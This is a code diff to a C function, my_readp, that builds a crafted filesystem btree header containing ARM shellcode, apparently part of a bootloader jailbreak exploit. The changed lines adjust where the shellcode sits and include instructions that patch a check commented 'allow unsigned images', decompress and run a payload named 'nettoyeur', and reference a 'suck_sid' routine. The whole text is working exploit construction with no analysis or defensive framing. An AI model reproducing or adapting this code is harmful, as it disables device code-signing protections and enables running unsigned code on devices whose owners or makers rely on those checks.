@@ -370,11 +370,8 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 
 #define START_OF_BTREE_HEADER 0x44594
 #define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
-#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x54)
+#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x2C) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
 #define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)
-                
-                /* bins (more or less) is at offset 0x447A0 */
-                /* first bin is at 0x447A0 + 0x28 = 0x447C8 */
                 
                 PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
                 
@@ -406,11 +403,12 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  46 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 60));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  48 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(3, nettoyeur_sz));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  50 - START_OF_EXTENTS_BTREE_HEADER, INSNT_PUSH_R0);
-                PUT_DWORD_LE(buffer, 0x47E88 +  52 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE + 52, decompress_lzss_ADDR - 1));
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  52 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE + 52, decompress_lzss_ADDR - 1));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  56 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 52));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  58 - START_OF_EXTENTS_BTREE_HEADER, INSNT_BLX_R(0));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  60 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(14, 4));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  62 - START_OF_EXTENTS_BTREE_HEADER, INSNT_POP_PC);
+                
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  76 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  80 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x44000000 */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  84 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x5ff00000 */);
@@ -419,7 +417,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 100 - START_OF_EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
-                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47D3C /* nettoyeur compressed */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x445BC /* nettoyeur compressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
                 
                 /* END */
